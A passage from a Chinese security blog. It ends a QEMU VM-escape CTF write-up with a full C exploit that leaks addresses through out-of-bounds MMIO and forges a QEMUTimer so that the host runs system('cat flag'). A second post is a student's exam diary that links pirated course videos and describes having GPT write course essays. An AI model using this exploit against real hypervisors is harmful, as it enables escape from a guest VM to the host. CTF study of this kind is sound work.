<p>在 bss 段有一个数组 <code>main_loop_tlg[4]</code>，保存了一些 <code>QEMUTimerList</code> 结构体指针，每个 <code>active_timers</code> 都指向一个由 <code>QEMUTimer</code> 结构体组成的链表。qemu 会遍历这些 <code>QEMUTimerList</code> 来检查所有 <code>QEMUTimer</code> 有没有超时并调用它们的 callback 函数（也就是调用 <code>timer-&gt;cb(timer-&gt;opaque)</code>，相关源码见<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/qemu/v4.2.1/source/util/qemu-timer.c#L588">qemu-timer.c - util&#x2F;qemu-timer.c - Qemu source code (v4.2.1) - Bootlin</a>）。</p>
<p>因此，我们可以在通过 <code>main_loop_tlg</code> 泄露某个 timerlist 的地址后，劫持它的 <code>active_timers</code> 指针并伪造一个 <code>QEMUTimer</code> 结构体，从而控制程序调用函数以及参数。</p>
<p>伪造 <code>QEMUTimer</code> 时，可以这样写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">timer-&gt;expire_time = <span class="number">0x114514</span>;</span><br><span class="line">timer-&gt;timer_list = 对应的timer_list地址;</span><br><span class="line">timer-&gt;cb = system@plt;</span><br><span class="line">timer-&gt;opaque = <span class="string">&quot;cat flag&quot;</span>;</span><br><span class="line">timer-&gt;next = null;</span><br><span class="line">timer-&gt;scale = <span class="number">0x100000000</span>;</span><br></pre></td></tr></table></figure>

<p>这样程序就会在 0x114514 纳秒之后调用 <code>system(&quot;cat flag&quot;)</code>。</p>
<p>该方法主要参考了：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.bi0s.in/2019/08/13/Pwn/VM-Escape/2019-07-29-qemu-vm-escape-cve-2019-14378/">QEMU VM Escape | bi0s</a></li>
<li><a target="_blank" rel="noopener" href="https://xtxtn.github.io/2023/10/11/CVE-2020-14364/#%E4%BF%AE%E6%94%B9time-list">CVE-2020-14364 - xtxtn’s Blog</a></li>
</ul>
<h3 id="EXP-脚本"><a href="#EXP-脚本" class="headerlink" title="EXP 脚本"></a>EXP 脚本</h3><p>没有在在线环境下试过这个脚本，不过猜测在线问题不大==。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GUN_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">buffer_write</span><span class="params">(<span class="type">uint64_t</span> index, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + <span class="number">32</span>)) = (index&lt;&lt;<span class="number">32</span>) | value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc ,<span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;open mmio failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;mmap failed !&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> prog_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">16</span>, <span class="number">-0x88</span>);</span><br><span class="line">    prog_base += mmio_read(<span class="number">32</span>) - <span class="number">0x82b35b</span>;</span><br><span class="line">    mmio_write(<span class="number">16</span>, <span class="number">-0x84</span>);</span><br><span class="line">    prog_base |= ((<span class="type">uint64_t</span>)mmio_read(<span class="number">32</span>))&lt;&lt;<span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]prog_base: 0x%lx\n&quot;</span>, prog_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> heap_base = prog_base &amp; ~(<span class="type">uint64_t</span>)<span class="number">0xffffffff</span>;</span><br><span class="line">    mmio_write(<span class="number">16</span>, <span class="number">-2808</span>);</span><br><span class="line">    heap_base += mmio_read(<span class="number">32</span>) - <span class="number">192</span>;</span><br><span class="line">    <span class="type">uint64_t</span> buf_addr = heap_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]buffer: 0x%lx\n&quot;</span>, buf_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak timer</span></span><br><span class="line">    <span class="type">uint64_t</span> main_loop_tlg = prog_base + <span class="number">0x14B9480</span>;</span><br><span class="line">    mmio_write(<span class="number">16</span>, main_loop_tlg+<span class="number">8</span>-buf_addr);</span><br><span class="line">    <span class="type">uint64_t</span> timer_list = (prog_base&amp;(~(<span class="type">uint64_t</span>)<span class="number">0xffffffff</span>)) + mmio_read(<span class="number">32</span>);</span><br><span class="line">    <span class="type">uint64_t</span> timer_ptr = timer_list + <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]timer_list: 0x%lx\n&quot;</span>, timer_list);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fake timer</span></span><br><span class="line">    <span class="type">uint64_t</span> system_plt = prog_base + <span class="number">0x312040</span>;</span><br><span class="line"></span><br><span class="line">    buffer_write(<span class="number">0</span>, <span class="number">0x114514</span>);</span><br><span class="line">    buffer_write(<span class="number">8</span>, timer_list&amp;<span class="number">0xffffffff</span>);</span><br><span class="line">    buffer_write(<span class="number">12</span>, timer_list&gt;&gt;<span class="number">32</span>);</span><br><span class="line">    buffer_write(<span class="number">16</span>, system_plt&amp;<span class="number">0xffffffff</span>);</span><br><span class="line">    buffer_write(<span class="number">20</span>, system_plt&gt;&gt;<span class="number">32</span>);</span><br><span class="line">    buffer_write(<span class="number">24</span>, (buf_addr+<span class="number">0x30</span>)&amp;<span class="number">0xffffffff</span>);</span><br><span class="line">    buffer_write(<span class="number">28</span>, (buf_addr+<span class="number">0x30</span>)&gt;&gt;<span class="number">32</span>);</span><br><span class="line">    buffer_write(<span class="number">44</span>, <span class="number">1</span>);</span><br><span class="line">    buffer_write(<span class="number">48</span>, <span class="number">0x20746163</span>); <span class="comment">// cat\x20</span></span><br><span class="line">    buffer_write(<span class="number">52</span>, <span class="number">0x67616c66</span>); <span class="comment">// flag</span></span><br><span class="line">    buffer_write(<span class="number">56</span>, <span class="number">0</span>);          <span class="comment">// \0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 劫持 target</span></span><br><span class="line">    <span class="type">int</span> offset = timer_ptr - buf_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-]offset: %d\n&quot;</span>, offset);</span><br><span class="line">    mmio_write(<span class="number">16</span>, offset);</span><br><span class="line">    mmio_write(<span class="number">48</span>, buf_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Daily/%E6%9D%82%E8%B0%88/c4b63d57adac.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Daily/%E6%9D%82%E8%B0%88/c4b63d57adac.html" class="post-title-link" itemprop="url">【杂谈#0x05】大三上期末日志</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-01-11 16:50:05 / Modified: 16:59:47" itemprop="dateCreated datePublished" datetime="2024-01-11T16:50:05+08:00">2024-01-11</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Daily/" itemprop="url" rel="index"><span itemprop="name">Daily</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Daily/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
                </span>
            </span>

          
            <span id="/Daily/%E6%9D%82%E8%B0%88/c4b63d57adac.html" class="post-meta-item leancloud_visitors" data-flag-title="【杂谈#0x05】大三上期末日志" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Daily/%E6%9D%82%E8%B0%88/c4b63d57adac.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Daily/%E6%9D%82%E8%B0%88/c4b63d57adac.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这里记录从 12.05 开始，我如何尝试实践各种方法来完成各种期末任务。<br>希望自己能做到高效应试！</p>
<p>主要依靠的资源包括：</p>
<ul>
<li>ChatGPT4（下称GPT）</li>
<li><a target="_blank" rel="noopener" href="https://same-smile-119.notion.site/FDU-82b7f0265fc743f7a9bbf32293495b52">FDU 开放题库 (notion.site)</a></li>
<li><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17BZsmReY5v1VxOSfSHkMvg?pwd=6brs">（盗版）猴博士视频 - 百度网盘</a></li>
<li>好同学</li>
</ul>
<h2 id="背景-amp-结果"><a href="#背景-amp-结果" class="headerlink" title="背景&amp;结果"></a>背景&amp;结果</h2><p>我在本学期中选课情况、期末时掌握情况和等地如下：</p>
<table>
<thead>
<tr>
<th>课程名称</th>
<th>学分</th>
<th>考试方式</th>
<th>考试时间</th>
<th>掌握情况</th>
<th>等地</th>
</tr>
</thead>
<tbody><tr>
<td>概率论与数理统计</td>
<td>4</td>
<td>闭卷</td>
<td>2024-01-02</td>
<td>前三章略懂，课全翘了</td>
<td>B</td>
</tr>
<tr>
<td>计算机病毒及其防治</td>
<td>2</td>
<td>闭卷</td>
<td>2023-12-18</td>
<td>课全翘了</td>
<td>B</td>
</tr>
<tr>
<td>信息内容安全</td>
<td>2</td>
<td>闭卷</td>
<td>2023-12-20</td>
<td>课全翘了</td>
<td>B</td>
</tr>
<tr>
<td>操作系统</td>
<td>3</td>
<td>闭卷</td>
<td>2023-12-28</td>
<td>课全翘了，懂一些基础</td>
<td>A</td>
</tr>
<tr>
<td>计算机取证</td>
<td>2</td>
<td>闭卷</td>
<td>2023-12-21</td>
<td>课全翘了</td>
<td>A</td>
</tr>
<tr>
<td>无线网络及安全</td>
<td>3</td>
<td>开卷</td>
<td>2023-12-22</td>
<td>课全翘了</td>
<td>A-</td>
</tr>
<tr>
<td>信息系统安全</td>
<td>3</td>
<td>闭卷</td>
<td>2023-12-18</td>
<td>掌握还行</td>
<td>A</td>
</tr>
<tr>
<td>物理学的新启示</td>
<td>1</td>
<td>论文</td>
<td></td>
<td>课全翘了</td>
<td>P</td>
</tr>
<tr>
<td>马克思主义基本原理</td>
<td>3</td>
<td>开卷</td>
<td>2023-12-19</td>
<td>上了一些课</td>
<td>B+</td>
</tr>
</tbody></table>
<p>注意到其中有八个学分的 B，我认为我自己已经尽力了，但这些困难是很难克服的客观原因。一个是绝对成绩给分（我考完才知道，气死了）；一个是考一堆超纲考题，这些超纲的题还是选了别的课的同学会做的；一个是课程难度比别的班都要高，速通确实很难搞定（但选别的班就完全能搞定了艹）。</p>
<p>接下来会按照课程顺序来划分章节。</p>
<hr>
<h2 id="概率论与数理统计-4-B"><a href="#概率论与数理统计-4-B" class="headerlink" title="概率论与数理统计 4 B"></a>概率论与数理统计 4 B</h2><h3 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h3><p>概率论虽然我的目标是 B+，但我认为是最难的一个考试了。为此，我一开始准备选择首先用猴博士速通，然后进入补刷作业题与对应知识点补齐环节，但是后来发现实际的准备时间只有三天左右……</p>
<p>我的复习就是在去年的卷子（来自开放题库）、猴博士的视频以及教材之间来回切换。我是否要学习教材上的内容取决于去年的卷子有没有考到相关内容、猴博士的视频有没有出现相关内容、以及课后布置的作业相关度。于是在省略了很多内容没有复习的情况下，终于在三天内学完了大部分概率论。<br>关于最后一两章，由于有太多需要背诵的内容，所以就直接不复习了。</p>
<p>最后考试的时候发现，和去年的卷子几乎考得一模一样，所以我准备的都做出来了，混了个 B。</p>
<p>我觉得如果我们班级和别的班考纲一样的话，我能混个 B+。郭大爷这教得也太多了，作业也多，不愧是高级概率论……</p>
<hr>
<h2 id="计算机病毒及其防治-2-B"><a href="#计算机病毒及其防治-2-B" class="headerlink" title="计算机病毒及其防治 2 B"></a>计算机病毒及其防治 2 B</h2><h3 id="课程-PJ"><a href="#课程-PJ" class="headerlink" title="课程 PJ"></a>课程 PJ</h3><p>花了一天，借用 DOSBox 的力量速通了。</p>
<h3 id="考试-1"><a href="#考试-1" class="headerlink" title="考试"></a>考试</h3><p>最后一节课老师说了考试重点，都是死记硬背，没有需要理解的东西。<br>周一的考试，周六把需要背的东西整理出了一个 word 文档，大概花了两三个小时；周日再复习了一下，手抄了其中部分感觉会考的东西。</p>
<p>考试估分 90+ 肯定有，据老师说 A 类要考 85 以上，考虑到我平时分是 3&#x2F;10 分的话（就没上过课），理论上我拿 A 类需要 95 以上。所以估计还是 B+ 吧。</p>
<p>然后最后是 B，因为老师按照绝对分给分。当时我为什么想不开选这个课呢，真是依托答辩……</p>
<hr>
<h2 id="信息内容安全-3-B"><a href="#信息内容安全-3-B" class="headerlink" title="信息内容安全 3 B"></a>信息内容安全 3 B</h2><h3 id="课程-PJ-1"><a href="#课程-PJ-1" class="headerlink" title="课程 PJ"></a>课程 PJ</h3><p>我在组内负责了数据清洗以及部分可视化任务，非常非常边缘，真的感谢队友大佬orz。<br>数据清洗继承了学长的 PJ 代码，进行了优化重构，把写得稀烂的正则表达式简化了一大截（主要用于知乎）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wash</span>(<span class="params">content</span>):</span><br><span class="line">    content = re.sub(<span class="string">r&#x27;&lt;sup[^&gt;]*&gt;.*&lt;\/sup&gt;&#x27;</span>, <span class="string">&quot;&quot;</span>, content)</span><br><span class="line">    content = re.sub(<span class="string">r&#x27;&lt;span[^&gt;]*&gt;.*&lt;\/span&gt;&#x27;</span>, <span class="string">&quot;&quot;</span>, content)</span><br><span class="line">    content = re.sub(<span class="string">r&#x27;&lt;figure[^&gt;]*&gt;.*&lt;\/figure&gt;&#x27;</span>, <span class="string">&quot;&quot;</span>, content)</span><br><span class="line">    content = re.sub(<span class="string">r&#x27;&lt;[^&gt;]*&gt;&#x27;</span>, <span class="string">&quot; &quot;</span>, content)</span><br><span class="line">    content = re.sub(<span class="string">r&#x27;\s+&#x27;</span>, <span class="string">&quot; &quot;</span>, content)</span><br><span class="line">    content = html.unescape(content)</span><br><span class="line">    content = content.lower()</span><br><span class="line">    <span class="keyword">return</span> content</span><br></pre></td></tr></table></figure>

<p>可视化任务，我使用官方 GPTs <strong>Data Analysis</strong> 进行辅助，效率惊人，只需要拖入 json 文件并指定需求就可以由 AI 自动写代码进行读取文件、可视化的代码编写和执行，比如下面代码完全由 GPT 生成：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the file paths</span></span><br><span class="line">file_paths = &#123;</span><br><span class="line">    <span class="string">&quot;zhihu_over_time&quot;</span>: <span class="string">&quot;./zhihu_gender_over_time.json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;zhihu_overall&quot;</span>: <span class="string">&quot;./zhihu_gender_overall.json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bilibili_over_time&quot;</span>: <span class="string">&quot;./bilibili_gender_over_time.json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bilibili_overall&quot;</span>: <span class="string">&quot;./bilibili_gender_overall.json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the data from each file</span></span><br><span class="line">data = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> key, path <span class="keyword">in</span> file_paths.items():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data[key] = json.load(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert the &#x27;Zhihu Over Time&#x27; data into a DataFrame</span></span><br><span class="line">zhihu_over_time_df = pd.DataFrame(data[<span class="string">&quot;zhihu_over_time&quot;</span>]).T</span><br><span class="line">zhihu_over_time_df.index = pd.to_datetime(zhihu_over_time_df.index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Plotting the time series data</span></span><br><span class="line">plt.figure(figsize=(<span class="number">12</span>, <span class="number">6</span>))</span><br><span class="line">plt.plot(zhihu_over_time_df, marker=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Zhihu Gender Distribution Over Time&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Date&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Count&#x27;</span>)</span><br><span class="line">plt.legend(zhihu_over_time_df.columns, title=<span class="string">&#x27;Gender Categories&#x27;</span>)</span><br><span class="line">plt.grid(<span class="literal">True</span>)</span><br><span class="line">plt.savefig(<span class="string">&quot;./zhihu_gender_over_time.svg&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="考试-2"><a href="#考试-2" class="headerlink" title="考试"></a>考试</h3><p>老师在最后一节课上划了期末重点，根据该重点和去年的卷子（lyr 天使！）复习。资料是一本纸质教材。</p>
<p>主要难题在于，<strong>复习时间只有一个晚上</strong>，第二天早八就考试了。这一部分复习没办法依靠 AI 了，主要依靠人类的力量速通！！</p>
<p>然后发现这门课考试真的离谱，考点都不考，重点全是说不考的。最后一章说是不考数学模型只要理解原理，结果考了个 26 分的压轴计算题。<br>听朋友说有很多同学哗哗写完了，应该是在别的课学过公式。<strong>但是这门课没教具体算法啊！！！</strong> 书上和 PPT 上都没有，我算得来才怪了。</p>
<p>最后遗憾拿 B，死因就是卷子实在是出得太逆反了，我认为我的复习很完美没啥问题了……</p>
<hr>
<h2 id="计算机取证-2-A"><a href="#计算机取证-2-A" class="headerlink" title="计算机取证 2 A"></a>计算机取证 2 A</h2><h3 id="课程-PJ-2"><a href="#课程-PJ-2" class="headerlink" title="课程 PJ"></a>课程 PJ</h3><p>我们做的是基础取证工具接入 GPT 智能判断功能，以及基本的数据关联。<br>基础的取证功能有<br>使用 GPT 生成基础代码框架和核心功能后，使用 copilot 速通 UI 编写。几小时就速通了。</p>
<h3 id="考试-3"><a href="#考试-3" class="headerlink" title="考试"></a>考试</h3><p>花了几个小时复习 PPT 。</p>
<p>最后闹出了乌龙，由于我 PPT 是 11 月下的，那时候老师还没传全，所以我漏看了整整 1&#x2F;4 的 PPT。怪不得考试的时候碰到好多不会的……不过还是拿了 A。</p>
<hr>
<h2 id="操作系统-3-A"><a href="#操作系统-3-A" class="headerlink" title="操作系统 3 A"></a>操作系统 3 A</h2><h3 id="考试-4"><a href="#考试-4" class="headerlink" title="考试"></a>考试</h3><p>考前老师划了一些重点，还放了个 429 页的复习 PPT……<br>根据重点和 PPT 进行复习，时间在三天左右。</p>
<p>最后熬了个大夜，终于速通完了那个 PPT，然后把四个往年卷子都看了一下。考试的时候感觉不错，没啥不会的题目，果然拿了 A。</p>
<hr>
<h2 id="无线网络及安全-3-A"><a href="#无线网络及安全-3-A" class="headerlink" title="无线网络及安全 3 A-"></a>无线网络及安全 3 A-</h2><h3 id="课程-PJ-3"><a href="#课程-PJ-3" class="headerlink" title="课程 PJ"></a>课程 PJ</h3><p>准备课程 PJ 的时候，留给我的只剩下一天+一个晚上了，这个时候正好看到 G.O.S.S.I.P 公众号上发了一篇蓝牙的综述性文章介绍，然后就放弃了实验，写了一个论文阅读笔记一类的报告。</p>
<h3 id="考试（开卷）"><a href="#考试（开卷）" class="headerlink" title="考试（开卷）"></a>考试（开卷）</h3><p>根据课件和去年卷子（感谢 wqh 天使）进行复习。<br>这确实是一门硬课，所以我的目标是<strong>在有限的时间内</strong>大致过一下课件，达到知道什么去哪里找的水平之后，将课件整理成便于打印的格式，现场查阅和学习。</p>
<p>考试的时候所有的题都写出来了，开卷考确实还是对记忆力差的人比较友好。</p>
<hr>
<h2 id="信息系统安全-3-A"><a href="#信息系统安全-3-A" class="headerlink" title="信息系统安全 3 A"></a>信息系统安全 3 A</h2><h3 id="考试-5"><a href="#考试-5" class="headerlink" title="考试"></a>考试</h3><p>虽然翘课翘了很多，但由于已经对所学知识有所了解，所以选择了速通所有课件并做往年卷子的方法。去年的卷子在开放题库上找到了。</p>
<p>大概花了一天进行速通，知识点和需要记得其实并不多。技巧性的东西集中在栈溢出相关知识，这些我本来就会，毕竟课后时间都花在这上了。</p>
<p>考试一小时速通了，估分满分。</p>
<hr>
<h2 id="马克思主义基本原理-3-B"><a href="#马克思主义基本原理-3-B" class="headerlink" title="马克思主义基本原理 3 B+"></a>马克思主义基本原理 3 B+</h2><h3 id="观后感"><a href="#观后感" class="headerlink" title="观后感"></a>观后感</h3><p>看了四集之后，用 GPT 生成了一段读后感，然后从看得几集里面加了几个例子进去，再加了几句自己的感想。</p>
<h3 id="论文征文"><a href="#论文征文" class="headerlink" title="论文征文"></a>论文征文</h3><p>GPT 半小时速通，虽然质量狗屎。<br>为了解决没有引用的问题，让 GPT 帮我加了一些例子，然后我去手动给这些例子寻找引用。比如引用什么国家统计局数据。</p>
<h3 id="考试（开卷）-1"><a href="#考试（开卷）-1" class="headerlink" title="考试（开卷）"></a>考试（开卷）</h3><p>没啥好说的，就瞎写写。没复习。</p>
<hr>
<h2 id="物理学的新启示-1-P"><a href="#物理学的新启示-1-P" class="headerlink" title="物理学的新启示 1 P"></a>物理学的新启示 1 P</h2><h3 id="课程报告"><a href="#课程报告" class="headerlink" title="课程报告"></a>课程报告</h3><p>GPT-4 支持直接阅读课件。我将每个老师的课件转换为大小较小的 PDF 格式，并扔给 GPT 进行总结。注意为了凑字数，需要一个问题一个问题问 GPT，不能让它一次答全。<br>最后花了大概两三个小时速通。</p>
<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>确实是非常累，不过感觉我能做的都已经做了，结局也还算满意。不过要是这个学期选课的时候能多获得一些信息的话就更好了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/2a2c8d32f543.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
